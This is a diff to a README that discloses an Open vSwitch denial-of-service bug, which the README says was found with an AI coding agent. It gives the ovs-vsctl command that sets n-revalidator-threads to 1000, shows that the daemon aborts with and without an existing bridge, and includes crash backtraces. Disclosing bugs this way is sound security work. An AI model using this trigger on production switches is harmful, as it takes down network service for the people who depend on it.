@@ -1,7 +1,12 @@
 # OVS-Switch-Config-Bug (CVE-2026-36499)
 
-A simple misconfiguration that can cause the OVS daemon to abort, which leads to a denial of service. This bug was found by analyzing the source code of the switch using an AI coding agent (Claude). Then, we tested the problem and prepared this proof-of-concept. This issue occurs when a privileged user writes an arbitrarily large integer to n-revalidator-threads in the Open_vSwitch other_config map, and then creates a bridge to trigger the bug. We tested this configuration bug on Open vSwitch v3.6.90.
+A simple misconfiguration that can cause the OVS daemon to abort, which leads to a denial of service. This bug was found by analyzing the source code of the switch using an AI coding agent (Claude). Then, we tested the problem and prepared this proof-of-concept. This issue occurs when a privileged user writes an arbitrarily large integer to n-revalidator-threads in the Open_vSwitch other_config map. We tested this configuration bug on Open vSwitch v3.6.90.
 
+We have two cases: 
+
+1) No bridge is added before (requires adding a new bridge):
+
+Initially, we create the new configuration:
 ```
 ovs-vsctl set Open_vSwitch . other_config:n-revalidator-threads=1000
 ```
@@ -42,6 +47,48 @@ ovs-vswitchd(+0x1e6285) [0x620d8ad88285]
 /lib/x86_64-linux-gnu/libc.so.6(+0x133b5c) [0x7904fe133b5c]
 ovs-vswitchd(revalidator508): lib/seq.c:98: pthread_mutex_lock failed: Resource deadlock avoided
 Aborted
+```
+
+
+2) If a bridge already exists, then no need to add a new bridge:
+
+Before the new configuration, a switch (b1) is already running:
+ovs-vsctl --may-exist add-br b1 
+
+Then a privileged user adds a new config:
+```
+ovs-vsctl set Open_vSwitch . other_config:n-revalidator-threads=1000
+```
+
+```
+2026-06-03T20:49:29Z|00039|ofproto_dpif_upcall|INFO|Overriding n-handler-threads to 16, setting n-revalidator-threads to 1000
+2026-06-03T20:49:29Z|00040|ofproto_dpif_upcall|INFO|Starting 1016 threads
+ovs-vswitchd(revalidator525): failed to create pipe (Too many open files)
+2026-06-03T20:49:29Z|00002|backtrace(revalidator525)|ERR|lib/vlog.c:1309 backtrace:
+ovs-vswitchd(+0x28dac9) [0x5dbc7e040ac9]
+ovs-vswitchd(+0x228686) [0x5dbc7dfdb686]
+ovs-vswitchd(+0x22874a) [0x5dbc7dfdb74a]
+ovs-vswitchd(+0x1e6340) [0x5dbc7df99340]
+ovs-vswitchd(+0x20b3d3) [0x5dbc7dfbe3d3]
+ovs-vswitchd(+0x17e865) [0x5dbc7df31865]
+ovs-vswitchd(+0x219737) [0x5dbc7dfcc737]
+ovs-vswitchd(+0x219c9d) [0x5dbc7dfccc9d]
+ovs-vswitchd(+0x1e5e90) [0x5dbc7df98e90]
+ovs-vswitchd(+0x151efa) [0x5dbc7df04efa]
+/lib/x86_64-linux-gnu/libc.so.6(+0x48271) [0x797573448271]
+/lib/x86_64-linux-gnu/libc.so.6(+0x4834e) [0x79757344834e]
+ovs-vswitchd(+0x220e19) [0x5dbc7dfd3e19]
+ovs-vswitchd(+0x2284d4) [0x5dbc7dfdb4d4]
+ovs-vswitchd(+0x22857a) [0x5dbc7dfdb57a]
+ovs-vswitchd(+0x22c0ca) [0x5dbc7dfdf0ca]
+ovs-vswitchd(+0x22c116) [0x5dbc7dfdf116]
+ovs-vswitchd(+0x20b6ff) [0x5dbc7dfbe6ff]
+ovs-vswitchd(+0x1e737f) [0x5dbc7df9a37f]
+ovs-vswitchd(+0x103648) [0x5dbc7deb6648]
+ovs-vswitchd(+0x1e6285) [0x5dbc7df99285]
+/lib/x86_64-linux-gnu/libc.so.6(+0xa27f1) [0x7975734a27f1]
+/lib/x86_64-linux-gnu/libc.so.6(+0x133b5c) [0x797573533b5c]
+ovs-vswitchd(revalidator525): lib/seq.c:98: pthread_mutex_lock failed: Resource deadlock avoided
 ```
 
 This bug is related to udpif_set_threads() function in ofproto/ofproto-dpif-upcall.c
